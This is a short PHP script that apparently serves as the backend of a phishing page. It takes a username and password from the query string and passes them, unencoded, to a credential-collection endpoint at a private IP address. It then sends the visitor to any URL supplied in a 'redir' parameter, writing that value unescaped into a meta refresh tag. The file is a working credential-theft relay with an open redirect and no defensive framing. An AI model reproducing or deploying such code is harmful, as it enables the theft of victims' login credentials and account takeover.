<?php
if(isset($_GET["user"]) and isset($_GET["pass"])) {
    $user = $_GET["user"];
    $pass = $_GET["pass"];
    $url = 'http://192.168.5.13:80/creds.php?user=' . $user . '&pass=' . $pass;
    file_get_contents($url);
}
if(isset($_GET["redir"])) {
    $redir = $_GET["redir"];
    if(filter_var($redir, FILTER_VALIDATE_URL)) {
        echo "<meta http-equiv='Refresh' content='0; url=" . $redir . "' />";
    }
}
?>
